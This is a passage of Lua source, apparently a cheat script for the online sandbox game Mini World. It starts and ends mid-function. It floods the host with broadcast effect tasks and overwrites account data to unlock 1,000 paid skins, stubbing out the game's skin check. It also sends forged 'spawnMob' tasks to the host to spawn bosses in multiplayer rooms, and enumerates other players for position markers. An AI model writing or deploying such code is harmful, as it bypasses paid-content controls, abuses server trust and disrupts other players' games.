            xpcall(function() 
                cb(selectedUin, t) 
            end, function(err)
                ShowGameTipsWithoutFilter("#cFF0000执行回调时出错：" .. tostring(err))
            end)
        end
    end
    
    -- 添加关闭处理
    local originalOnClose = HomeEvent.OnClose
    function HomeEvent:OnClose(...)
        if _G._tempPlayerCancel then
            local cancel = _G._tempPlayerCancel
            -- 清空全局变量
            _G._tempPlayerCallback = nil
            _G._tempPlayerCancel = nil
            _G._tempPlayerTitle = nil
            -- 执行取消回调
            xpcall(cancel, function(err) end)
        end
        if originalOnClose then
            originalOnClose(self, ...)
        end
    end
    
    return true
end




-- ==================== 通用工具函数 ====================
function readFile_1(ft)
    local filepath = filepath_root..'axdx/'..ft..'/3'
    local file, err = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

function readFile(ft)
    local filepath = filepath_root..'axdx/'..ft..'/text'
    local file, err = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

function trigger()
    InitGameAPI()
    GameVmTriggerInit()
end

function RoomIsSer()
    local csroomidS = GetCurrentCSRoomId()
    if not csroomidS or csroomidS == "" then
        MessageBox(4, "联机不可用，请前往云服")
        return false
    end
    return true
end

-- ==================== 统一确认框 ====================
function ShowConfirmFrame(title, onEnable, onDisable)
    getglobal("OutGameConfirmFrameFor4399"):Show()
    getglobal("OutGameConfirmFrameFor4399Desc"):SetText("#K" .. title, 40, 38, 33)
    currentConfirmCallback = { onEnable = onEnable, onDisable = onDisable }
end

function OutGameConfirmFrameLeftBtnFor4399_OnClick()
    getglobal("OutGameConfirmFrameFor4399"):Hide()
    if currentConfirmCallback and currentConfirmCallback.onEnable then
        currentConfirmCallback.onEnable()
    end
end

function OutGameConfirmFrameRightBtnFor4399_OnClick()
    getglobal("OutGameConfirmFrameFor4399"):Hide()
    if currentConfirmCallback and currentConfirmCallback.onDisable then
        currentConfirmCallback.onDisable()
    end
end

-- ==================== 房员列表相关 ====================
local HomelandLuas = {
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordCtrl.lua",
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordModel.lua",
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordView.lua"
}

function LoadHomelandLuas()
    for i, luapath in ipairs(HomelandLuas) do
        if g_LuaPreLoadMgr and g_LuaPreLoadMgr.LoadALuaFile then
            g_LuaPreLoadMgr:LoadALuaFile(luapath)
        end
    end
end

function GetPlayerUinList()
    local uin_list = {}
    if ClientCurGame and ClientCurGame:isInGame() and AccountManager and AccountManager:getMultiPlayer() > 0 then
        local num = ClientCurGame:getNumPlayerBriefInfo() or 0
        for i = 1, num do
            local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
            if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                table.insert(uin_list, briefInfo.uin)
            end
        end
    end
    return uin_list
end



-- ==================== 输入框相关 ====================
local inputContent = nil
function ShowInputFrame(callback)
    local MiniUIManager = GetInst("MiniUIManager")
    MiniUIManager:OpenUI("CommonRenameFrame", "miniui/miniworld/CommonRenameFrame", "CommonRenameFrameAutoGen")
    local inputFrame = MiniUIManager:GetMVC("CommonRenameFrameAutoGen")
    
    function inputFrame:BtnSureClick(obj, context)
        inputContent = self.view.widgets.inputName:getText()
        self:CloseSelf()
        if callback then callback(inputContent) end
    end
end


-- ==================== 功能函数 ====================
-- 专属特

          



















function zstx()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        for i = 1, #commonNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { AccountManager:getUin(), commonNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

-- 获得全皮
function hdqp()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        local accountData = AccountManager:getAccountData().Account.BillDataSvr
        accountData.RoleSkinNum = 1000
        local t = {}
        for i = 1, 1000 do
            t[i] = { ExpireTime = -1, SkinID = i }
        end
        accountData.RoleSkinInfo = t
        AccountManager.useRoleSkinModel = function(self, skinid) return true end
    end
end


function zdsw()
    getglobal("CreateMonsterFrame"):Show()
    
      local CreateMonsterTable = {
	config = {
		-- 右侧属性面板所有UI控件配置数组（滑块/开关/分割线/生物选择框）
		widgetAttributes = {
			-- 控件1：生物选择下拉框
			{
				Type = "Selection",
				Name_StringID = 6317,
				CurVal = 0,
				CanShow = true
			},
			-- 分割线1
			{
				Type = "Line",
				Title_StringID = 21201,
				CanShow = true
			},
			-- 控件2：单次生成生物数量 滑块
			{
				Type = "Slider",
				Name_StringID = 21202,
				CurVal = 1,
				Min = 1, Max = 32, Step = 1,
				ValShowType = "Int",
				CanShow = true
			},
			-- 控件3：高级参数总开关
			{
				Type = "Switch",
				Name_StringID = 21208,
				CurVal = false,
				CanShow = true,
				HelpButton = true
			},
			-- 控件4：生成延迟 滑块
			{
				Type = "Slider",
				Name_StringID = 21203,
				CurVal = 10,
				Min = 1, Max = 100, Step = 1,
				ValShowType = "Int",
				CanShow = false,
				HelpButton = true
			},
			-- 分割线2
			{
				Type = "Line",
				Title_StringID = 21204,
				CanShow = true
			},
			-- 控件5：生成横向范围
			{
				Type = "Slider",
				Name_StringID = 21204,
				CurVal = 1,
				Min = 1, Max = 32, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 9111,
				CanShow = true
			},
			-- 控件6：生成纵向范围
			{
				Type = "Slider",
				Name_StringID = 21205,
				CurVal = 1,
				Min = 1, Max = 256, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 9111,
				CanShow = true
			},
			-- 分割线3
			{
				Type = "Line",
				Title_StringID = 21206,
				CanShow = true
			},
			-- 控件7：生成上限总开关
			{
				Type = "Switch",
				Name_StringID = 21206,
				CurVal = false,
				CanShow = true
			},
			-- 控件8：地图最大存活生物数量
			{
				Type = "Slider",
				Name_StringID = 21207,
				CurVal = 18,
				Min = 1, Max = 180, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 559,
				CanShow = false,
				HelpButton = true
			}
		},
		-- 默认生物分类列表（3个分类）
	defaultMonsters = {
    -- 第1页：常见动物/生物
  {
    Type = 1,
    ID = {3010,3011,3012,3013,3014,3015,3016,3017,3018,3019,3020,3021,3022,3095,3096,3097,
          3098,3099,3200,3201,3202,3203,3204,3205,3206,3207,3208,3209,3210,3211,3212,3213,
          3214,3215,3216,3217,3218,3219,3222,3223,3229,3230,3231,3232,3233,3234,3235,3236,
          3237,3238,3239,3241,3242,3243,3400,3401,3402,3403,3404,3405,3406,3407,3408,3409,
          3410,3411,3412,3413,3414,3415,3416,3417,3418,3419,3421,3422,3423,3424,3505,3506,
          3507}
},
    -- 第2页：动物/怪物
    {
    Type = 2,
    ID = {3101,3102,3103,3105,3107,3109,3110,3111,3112,3113,3114,3115,3116,3117,3118,3120,
          3121,3122,3123,3124,3125,3126,3130,3131,3132,3135,3165,3166,3167,3168,3169,3170,
          3171,3172,3173,3174,3175,3176,3177,3178,3179,3180,3181,3182,3183,3184,3185,3186,
          3187,3188,3189,3190,3191,3192,3193,3194,3195,3196,3197,3198,3199,3220,3221,3224,
          3225,3226,3227,3228,3244,3245,3246,3247,3248,3249,3250,3251,3252,3253,3254,3255,
          3261}
},
    -- 第3页：怪物/Boss/特殊

        -- Type3：BOSS/精英（精简到81个）
{
    Type = 3,
    ID = {3420,3425,3521,3240,3230,3231,3232,3507,3898,3899,3520,3519,3505,3506,3508,3509,
      3517,3897,3900,3916,3917,3918,3919,3928,3934,4001,4002,4200,4201,4500,4501,4502,
      4503,4504,4505,4506,4507,4508,4509,4510,4511,4512,4513,4514,4515,4516,4517,4518,
      4519,4520,4521,4522,4523,4524,4525,4526,4527,4528,4529,4530,4531,4532,4533,4534,
      4535,4536,4537,4538,4539,4540,4541,4542,4543,4544,4545,4546,4547,3501,3502,3503,
      3504,3510,3511,3512,3513,3514,3515,3516}
}
		},
		
		-- 帮助弹窗布局配置
		helpButtons = {
			SingleCreateSelection1HelpBtn = {
				name = "SingleCreateSelection1HelpBtn",
				childName = {"Bkg","Icon","Choose","Attribute","Life","Attack","Describe","Details"},
				children = {},
				childrenAttr = {
					closed = {
						{"point","Bkg","top","SingleCreateSelection1HelpBtnNormal","bottom",-61,0},
						{"point","","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","Normal","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","PushedBG","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"size","",30,31},
						{"strata","",4}
					},
					opening = {
						{"point","Bkg","top","SingleCreateSelection1HelpBtnNormal","bottom",-61,0},
						{"point","","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","Normal","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","PushedBG","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"size","",668,200},
						{"strata","",5}
					}
				}
			}
		},
		height = {
			Line = 40,
			Switch = 60,
			Slider = 70,
			Selection = 150
		}
	},
	-- 全局常量定义
	constants = {
		INIT_ID = 4000,
		MAX_TAB_NUM = 3,  -- 3个分类
		MAX_ORGANISM_GRID_NUM = 81,
		IO_PARAMS_NAME = {
			"MobResID","everyNum","maxNum","spawnWide","spawnHigh","spawnDelay","numSwitch","DelaySwitch"
		},
		IO_PARAMS_INDEX = {1,3,5,7,8,11,4,10},
		-- 分类标签多语言文本
		TAB_NAME_STRING_ID = {
			[1] = "生物",
			[2] = "怪物",
			[3] = "特殊物品"
		}
	},
	organismdefs = {}
}

local main = CreateMonsterTable
local tmpChooseMonsterDef, curChooseMonsterDef
local curChooseType = 1  -- 默认选中"生物"分类（Type=1）
local needInit = true

function getCreateMonsterTable()
	return CreateMonsterTable
end

local function getType(id)
	for i = 1, #main.config.defaultMonsters do
		local ids = main.config.defaultMonsters[i]
		for j = 1, #ids.ID do
			if id == ids.ID[j] then
				return ids.Type
			end
		end
	end
	return 1
end

-- 给图标控件加载生物头像
local function setIcon(icon, def)
	if tonumber(def.ID) and tonumber(def.ID) == main.constants.INIT_ID then
		return
	end
	if def.ModelType == MONSTER_CUSTOM_MODEL then
		SetModelIcon(icon, def.Model, ACTOR_MODEL)
		return
	elseif def.ModelType == MONSTER_FULLY_CUSTOM_MODEL then
		SetModelIcon(icon, def.Model, FULLY_ACTOR_MODEL)
		return
	elseif def.ModelType == MONSTER_IMPORT_MODEL then
		SetModelIcon(icon, def.Model, IMPORT_ACTOR_MODEL)
		return
	end
	if tonumber(def.Icon) and tonumber(def.Icon) > 0 then
		icon:SetTexture("ui/roleicons/" .. def.Icon .. ".png", true)
	else
		icon:SetTexture("ui/roleicons/" .. def.ID .. ".png", true)
	end
	if type(def.Icon) == "string" and string.sub(def.Icon, 1, 1) == "a" then
		AvatarSetIconByID(def, icon)
	end
end

local function hideHelpBtn(exclude)
	if getglobal("SingleCreateSlider2HelpBtnBkg"):IsShown() and exclude ~= 1 then
		getglobal("SingleCreateSlider2HelpBtnBkg"):Hide()
		getglobal("SingleCreateSlider2HelpBtnTips"):Hide()
		getglobal("SingleCreateSlider2HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSlider2HelpBtn"):SetSize(30, 31)
	end
	if getglobal("SingleCreateSwitch1HelpBtnBkg"):IsShown() and exclude ~= 2 then
		getglobal("SingleCreateSwitch1HelpBtnBkg"):Hide()
		getglobal("SingleCreateSwitch1HelpBtnTips"):Hide()
		getglobal("SingleCreateSwitch1HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSwitch1HelpBtn"):SetSize(30, 31)
	end
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() and exclude ~= 3 then
		getglobal("SingleCreateSelection1HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSelection1HelpBtn"):SetSize(30, 31)
		getglobal("SingleCreateSelection1HelpBtnBkg"):SetPoint("top", "SingleCreateSelection1HelpBtn", "top", -61, 0)
		getglobal("SingleCreateSelection1HelpBtn"):SetPoint("bottomleft", "SingleCreateSelection1", "bottomright", 5, 0)
		local names = main.config.helpButtons.SingleCreateSelection1HelpBtn.childName
		for i = 1, #names do
			getglobal("SingleCreateSelection1HelpBtn" .. names[i]):Hide()
		end
	end
end

function CreateMonsterFrame_OnClick()
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() then
		CreateMonsterHelpBtn_OnClick()
	end
	hideHelpBtn(0)
end

function CreateMonsterFrame_OnShow()
	if not needInit then
		return
	end
	needInit = false
	HideAllFrame("CreateMonsterFrame", true)
	hideHelpBtn(0)
	LoadOrganismDef()
	if not getglobal("CreateMonsterFrame"):IsReshow() then
		ClientCurGame:setOperateUI(true)
	end
	local curSetting = OpenContainer:getBrushMonsterAttr()
	local names = main.constants.IO_PARAMS_NAME
	local indexs = main.constants.IO_PARAMS_INDEX
	for i = 1, #names do
		main.config.widgetAttributes[indexs[i]].CurVal = curSetting[names[i]]
		if names[i] == "spawnDelay" then
			main.config.widgetAttributes[indexs[i]].CurVal = main.config.widgetAttributes[indexs[i]].CurVal / 20
		end
		if string.find(names[i], "Switch") then
			main.config.widgetAttributes[indexs[i] + 1].CanShow = curSetting[names[i]]
		end
	end
	if main.config.widgetAttributes[1].CurVal == main.constants.INIT_ID then
		curChooseMonsterDef = nil
		tmpChooseMonsterDef = nil
	end
	UpdateCreateMonsterFrame()
end

function CreateMonsterFrame_OnHide()
	needInit = true
	curChooseType = 1
	curChooseMonsterDef = nil
	tmpChooseMonsterDef = nil
	ShowMainFrame()
	if not getglobal("CreateMonsterFrame"):IsRehide() then
		ClientCurGame:setOperateUI(false)
	end
	UIFrameMgr:setCurEditBox(nil)
end

function CreateMonsterFrame_OnLoad()
	UpdateCreateMonsterFrame()
	for i = 1, main.constants.MAX_ORGANISM_GRID_NUM / 9 do
		for j = 1, 9 do
			local index = (i - 1) * 9 + j
			local grid = getglobal("OrganismGrid" .. index)
			grid:SetPoint("topleft", "OrganismGridBoxPlane", "topleft", (j - 1) * 84, (i - 1) * 84)
		end
	end
end

function CreateMonsterFrameCloseBtn_OnClick()
	hideHelpBtn(0)
	getglobal("CreateMonsterFrame"):Hide()
end

-- 保存按钮：把UI参数写入刷怪方块属性并关闭面板
function CreateMonsterFrameSaveBtn_OnClick()
	hideHelpBtn(0)
	if curChooseMonsterDef then
		local params = {}
		local attr = CreateMonsterTable.config.widgetAttributes
		-- 组装存储参数
		params.id = curChooseMonsterDef.ID
		params.everyNum = attr[3].CurVal
		params.maxNum = attr[5].CurVal
		params.spawnWide = attr[7].CurVal
		params.spawnHigh = attr[8].CurVal
		params.spawnDelay = attr[11].CurVal
		params.numSwitch = attr[4].CurVal
		params.delaySwitch = attr[10].CurVal
		
		if next(params) == nil then
			Log("CreateMonsterFrameSaveBtn_OnClick : params ERROR !!!")
		else
			-- 持久化参数到刷怪方块
			OpenContainer:setBrushMonsterAttr(params.id, params.everyNum, params.maxNum, params.spawnWide, params.spawnHigh, params.spawnDelay, params.numSwitch, params.delaySwitch)
			
			-- ===== 执行刷怪脚本 =====
			-- 获取玩家位置
			local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
			local new_x, new_y, new_z = x / 100, y / 100, z / 100
			
			-- 加上偏移量（横向范围 + 纵向范围）
			local offsetX = params.spawnWide or 1
			local offsetZ = params.spawnWide or 1
			local offsetY = params.spawnHigh or 1
			
			-- 生成在玩家前方偏移位置
			local spawnX = new_x + offsetX
			local spawnY = new_y + offsetY
			local spawnZ = new_z + offsetZ
			
			-- 打印调试信息
			print("=== 刷怪执行 ===")
			print("生物ID: " .. params.id)
			print("生成数量: " .. params.everyNum)
			print("玩家位置: " .. new_x .. ", " .. new_y .. ", " .. new_z)
			print("生成位置: " .. spawnX .. ", " .. spawnY .. ", " .. spawnZ)
			
			-- 组装数据
			local tdata = {
				[1] = "world",
				[2] = "spawnMob",
				[3] = { 
					spawnX,          -- X坐标（玩家位置 + 横向偏移）
					spawnY,          -- Y坐标（玩家位置 + 纵向偏移）
					spawnZ,          -- Z坐标（玩家位置 + 横向偏移）
					params.id,       -- 生物ID
					params.everyNum, -- 生成数量
					true             -- 固定参数
				}
			}
			-- 发送到服务端执行
			ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
			-- ===== 结束 =====
		end
		ShowGameTips(GetS(3940))
		getglobal("CreateMonsterFrame"):Hide()
	end
end

function ChooseOrganismFrame_OnLoad()
end

function ChooseOrganismFrame_OnShow()
	UpdateOrganismGridBox()
	getglobal("ChooseOrganismFrameOkBtn"):SetClientID(0)
end

function ChooseOrganismFrame_OnHide()
end

local checkedHaloName

function OrganismGridTemplate_OnClick()
	local id = this:GetClientID()
	if checkedHaloName then
		getglobal(checkedHaloName .. "Checked"):Hide()
	end
	checkedHaloName = this:GetName()
	getglobal(checkedHaloName .. "Checked"):Show()
	tmpChooseMonsterDef = nil
	local def = ModEditorMgr:getMonsterDefById(id)
	def = def or MonsterCsv:get(id)
	if def then
		UpdateTipsFrame(def.Name, 0)
		tmpChooseMonsterDef = def
		print(tmpChooseMonsterDef.ID)
	end
end

function CreateTabTemplate_OnClick()
	local index = this:GetClientID()
	local btnName = this:GetName()
	local checked = getglobal(btnName .. "Checked")
	if checked:IsShown() then
		return
	end
	local defs = main.organismdefs
	if defs and defs[index] then
		curChooseType = defs[index].Type
	end
	UpdateOrganismGridBox()
	SetChooseOrganismFrameTab()
end

function ChooseOrganismFrameClose_OnClick()
	hideHelpBtn(0)
	getglobal("ChooseOrganismFrame"):Hide()
	tmpChooseMonsterDef = nil
end

local selectCallBack

function SetCreateMonsterFrameSelectMonsterCallBack(callback)
	selectCallBack = callback
end

function ChooseOrganismFrameOkBtn_OnClick()
	curChooseMonsterDef = tmpChooseMonsterDef
	if curChooseMonsterDef then
		getglobal("ChooseOrganismFrame"):Hide()
		main.config.widgetAttributes[1].CurVal = curChooseMonsterDef.ID
		local name = getglobal("SingleCreateSelection1" .. "Choose")
		local icon = getglobal("SingleCreateSelection1" .. "Btn" .. "Icon")
		name:SetText(curChooseMonsterDef.Name)
		setIcon(icon, curChooseMonsterDef)
		getglobal("SingleCreateSelection1" .. "HelpBtn"):Show()
		name:Show()
		icon:Show()
		if selectCallBack then
			selectCallBack(curChooseMonsterDef)
		end
	end
end

function UpdateCreateMonsterFrame()
	local attributes = main.config.widgetAttributes
	local height = main.config.height
	local widgetIndex = {Selection = 1, Line = 1, Switch = 1, Slider = 1}
	local pointY = 0
	for i = 1, #attributes do
		local frame = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type])
		if frame then
			if attributes[i].Type == "Slider" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local valFont = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Val")
				local bar = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Bar")
				local curVal = attributes[i].CurVal
				bar:SetMinValue(attributes[i].Min)
				bar:SetMaxValue(attributes[i].Max)
				bar:SetValueStep(attributes[i].Step)
				bar:SetValue(curVal)
				name:SetText(GetS(attributes[i].Name_StringID))
				if attributes[i].ValShowType == "Int" then
					valFont:SetText(curVal)
				elseif attributes[i].ValShowType == "IntUnit" then
					valFont:SetText(curVal .. GetS(attributes[i].Unit_StringID))
				end
			elseif attributes[i].Type == "Line" then
				if attributes[i].Title_StringID then
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "LineZheZhao"):Show()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):Show()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):SetText(GetS(attributes[i].Title_StringID))
				else
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "LineZheZhao"):Hide()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):Hide()
				end
			elseif attributes[i].Type == "Switch" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local switchBtn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Btn")
				local state = attributes[i].CurVal and 1 or 0
				name:SetText(GetS(attributes[i].Name_StringID))
				SetSwitchBtnState(switchBtn:GetName(), state)
			elseif attributes[i].Type == "Selection" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local attrBtn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "HelpBtn")
				local choose = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Choose")
				local id = attributes[i].CurVal
				local btn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Btn")
				local icon = getglobal(btn:GetName() .. "Icon")
				name:SetText(GetS(attributes[i].Name_StringID))
				if attributes[i].CurVal ~= main.constants.INIT_ID then
					btn:Show()
					curChooseMonsterDef = ModEditorMgr:getMonsterDefById(id)
					if not curChooseMonsterDef then
						curChooseMonsterDef = MonsterCsv:get(id)
					end
					if curChooseMonsterDef then
						setIcon(icon, curChooseMonsterDef)
						choose:SetText(curChooseMonsterDef.Name)
						choose:Show()
						attrBtn:Show()
						icon:Show()
					end
				else
					choose:Hide()
					attrBtn:Hide()
					icon:Hide()
				end
			end
			frame:SetClientID(i)
			if i == 1 then
				frame:SetPoint("bottom", "SingleCreateAttrBox", "top", 0, pointY)
			else
				frame:SetPoint("top", "SingleCreateAttrBoxPlane", "top", 0, pointY)
			end
			if attributes[i].HelpButton then
				getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "HelpBtn"):Show()
			end
			if 1 < i and attributes[i].CanShow then
				pointY = pointY + height[attributes[i].Type]
			end
		else
			Log("ERROR : uiFrame is nil")
		end
		if attributes[i].CanShow then
			frame:Show()
		else
			frame:Hide()
		end
		widgetIndex[attributes[i].Type] = widgetIndex[attributes[i].Type] + 1
	end
	if pointY < 516 then
		pointY = 516
	end
	getglobal("SingleCreateAttrBoxPlane"):SetHeight(pointY)
end

local function getTableByType(type)
	local defs = main.organismdefs
	for i = 1, #defs do
		if type == defs[i].Type then
			return defs[i].t
		end
	end
	return nil
end

function UpdateOrganismGridBox()
	if checkedHaloName then
		getglobal(checkedHaloName .. "Checked"):Hide()
	end
	getglobal("OrganismGridBox"):resetOffsetPos()
	local typeTable = getTableByType(curChooseType)
	if typeTable == nil then
		ShowGameTips(GetS(3758), 3)
		getglobal("ChooseOrganismFrame"):Hide()
		return
	end
	local num = #typeTable
	for i = 1, main.constants.MAX_ORGANISM_GRID_NUM do
		local grid = getglobal("OrganismGrid" .. i)
		if i <= num then
			grid:Show()
			grid:SetClientID(typeTable[i].ID)
			local icon = getglobal(grid:GetName() .. "Icon")
			setIcon(icon, typeTable[i])
		else
			grid:Hide()
		end
	end
	local height = 333 + math.ceil((num - 36) / 9) * 84
	if height < 333 then
		height = 333
	end
	getglobal("OrganismGridBoxPlane"):SetSize(755, height)
end

function SetChooseOrganismFrame()
	LoadOrganismDef()
	SetChooseOrganismFrameTab()
	UpdateOrganismGridBox()
	getglobal("ChooseOrganismFrame"):Show()
end

function SetChooseOrganismFrameTab()
	local defs = main.organismdefs
	for i = 1, main.constants.MAX_TAB_NUM do
		local tab = getglobal("ChooseOrganismFrameTabs" .. i)
		if tab then
			local name = getglobal("ChooseOrganismFrameTabs" .. i .. "Name")
			local normal = getglobal("ChooseOrganismFrameTabs" .. i .. "Normal")
			local checked = getglobal("ChooseOrganismFrameTabs" .. i .. "Checked")
			tab:SetClientID(i)
			if defs[i] and defs[i].Type == curChooseType then
				normal:Hide()
				checked:Show()
			else
				normal:Show()
				checked:Hide()
			end
			tab:Show()
			local type = defs[i].Type
			local nameStr = main.constants.TAB_NAME_STRING_ID[type]
			name:SetText(nameStr or "分类" .. type)
		end
	end
end

function LoadOrganismDef()
	main.organismdefs = {}
	local defs = main.organismdefs
	for i = 1, #main.config.defaultMonsters do
		local one = main.config.defaultMonsters[i]
		for j = 1, #one.ID do
			local def = MonsterCsv:get(one.ID[j])
			if def then
				local t = getTableByType(one.Type)
				if t == nil then
					table.insert(defs, {Type = one.Type, t = {def}})
				else
					table.insert(t, def)
				end
			end
		end
	end
	table.sort(defs, function(a, b)
		return a.Type < b.Type
	end)
end

function CreateMonsterHelpBtn_OnClick()
	hideHelpBtn(3)
	local btn = main.config.helpButtons.SingleCreateSelection1HelpBtn
	local attr
	if next(btn.children) == nil then
		for i = 1, #btn.childName do
			btn.children[btn.childName[i]] = getglobal(btn.name .. btn.childName[i])
		end
	end
	setIcon(btn.children.Icon, curChooseMonsterDef)
	btn.children.Choose:SetText(curChooseMonsterDef.Name)
	local typeId = getType(curChooseMonsterDef.ID)
	local typeName = main.constants.TAB_NAME_STRING_ID[typeId] or "未知分类"
	btn.children.Attribute:SetText(GetS(1107) .. GetS(8503) .. typeName)
	btn.children.Life:SetText(GetS(4300) .. GetS(8503) .. curChooseMonsterDef.Life)
	local atkpoint = 0
	if 0 <= curChooseMonsterDef.AttackType and curChooseMonsterDef.AttackType <= 2 then
		atkpoint = curChooseMonsterDef.Attacks[curChooseMonsterDef.AttackType]
	end
	btn.children.Attack:SetText(GetS(4302) .. GetS(8503) .. atkpoint)
	if tostring(curChooseMonsterDef.Desc) ~= "" then
		btn.children.Details:SetText(curChooseMonsterDef.Desc)
	else
		btn.children.Details:SetText(GetS(58))
	end
	if btn.children.Bkg and btn.children.Bkg:IsShown() then
		attr = btn.childrenAttr.closed
	else
		attr = btn.childrenAttr.opening
	end
	for i = 1, #attr do
		local fun = attr[i]
		local obj = getglobal(btn.name .. fun[2])
		if fun[1] == "point" then
			obj:SetPoint(fun[3], fun[4], fun[5], fun[6], fun[7])
		elseif fun[1] == "size" then
			obj:SetSize(fun[3], fun[4])
		elseif fun[1] == "strata" then
			obj:SetFrameStrataInt(fun[3])
		end
	end
	for i = 1, #btn.childName do
		local child = btn.children[btn.childName[i]]
		if child:IsShown() then
			child:Hide()
		else
			child:Show()
		end
	end
end

function SingleCreateFeatureHelpBtn_OnClick()
	local bkg, tips
	if string.find(this:GetName(), "Slider") then
		hideHelpBtn(1)
		bkg = getglobal("SingleCreateSlider2HelpBtnBkg")
		tips = getglobal("SingleCreateSlider2HelpBtnTips")
		if bkg:IsShown() then
			getglobal("SingleCreateSlider2HelpBtnNormal"):SetPoint("topleft", "SingleCreateSlider2HelpBtn", "topleft", 0, 0)
		else
			getglobal("SingleCreateSlider2HelpBtnNormal"):SetPoint("bottomright", "SingleCreateSlider2HelpBtn", "bottomright", 0, 0)
			this:SetSize(240, 200)
		end
	else
		hideHelpBtn(2)
		bkg = getglobal("SingleCreateSwitch1HelpBtnBkg")
		tips = getglobal("SingleCreateSwitch1HelpBtnTips")
		if bkg:IsShown() then
		else
			this:SetSize(220, 220)
		end
	end
	if bkg:IsShown() then
		bkg:Hide()
		tips:Hide()
		this:SetFrameStrataInt(4)
		this:SetSize(30, 31)
	else
		this:SetFrameStrataInt(5)
		bkg:Show()
		tips:Show()
	end
end

function CreateSliderTemplateLeftBtn_OnClick()
	hideHelpBtn()
	local value = getglobal(this:GetParent() .. "Bar"):GetValue()
	local index = this:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	value = value - widget.Step
	getglobal(this:GetParent() .. "Bar"):SetValue(value)
end

function CreateSliderTemplateBar_OnValueChanged()
	hideHelpBtn()
	local value = this:GetValue()
	local ratio = (value - this:GetMinValue()) / (this:GetMaxValue() - this:GetMinValue())
	if 1 < ratio then ratio = 1 end
	if ratio < 0 then ratio = 0 end
	local width = math.floor(183 * ratio)
	getglobal(this:GetName() .. "Pro"):ChangeTexUVWidth(width)
	getglobal(this:GetName() .. "Pro"):SetWidth(width)
	local index = this:GetParentFrame():GetClientID()
	local t = main.config.widgetAttributes[index]
	t.CurVal = value
	local valFont = getglobal(this:GetParent() .. "Val")
	if t.ValShowType then
		if t.ValShowType == "Int" then
			valFont:SetText(value)
		elseif t.ValShowType == "IntUnit" then
			valFont:SetText(value .. GetS(t.Unit_StringID))
		end
	end
end

function CreateSliderTemplateRightBtn_OnClick()
	hideHelpBtn()
	local value = getglobal(this:GetParent() .. "Bar"):GetValue()
	local index = this:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	value = value + widget.Step
	getglobal(this:GetParent() .. "Bar"):SetValue(value)
end

function CreateSelBtnTemplate_OnClick()
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() then
		CreateMonsterHelpBtn_OnClick()
	end
	hideHelpBtn()
	SetChooseOrganismFrame()
end

function CreateSwitchTemplateBtn_OnClick(swithcName, state)
	hideHelpBtn()
	local switch = getglobal(swithcName)
	local index = switch:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	state = state == 1
	widget.CurVal = state
	if state then
		main.config.widgetAttributes[index + 1].CanShow = true
	else
		main.config.widgetAttributes[index + 1].CanShow = false
	end
	UpdateCreateMonsterFrame()
end
end

function hzwj()
local myUin = AccountManager:getUin()
local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
for i = 1, size do
    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)  -- 修正索引
    if targetPlayer then
        local targetUin = targetPlayer:getUin()
        if targetUin ~= myUin then
            local size = 100
            local color = 0xff0000
            local id = 10230 + i  -- 使 ID 唯一

            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
            local new_x = x / 100
            local new_y = y / 100 + 90
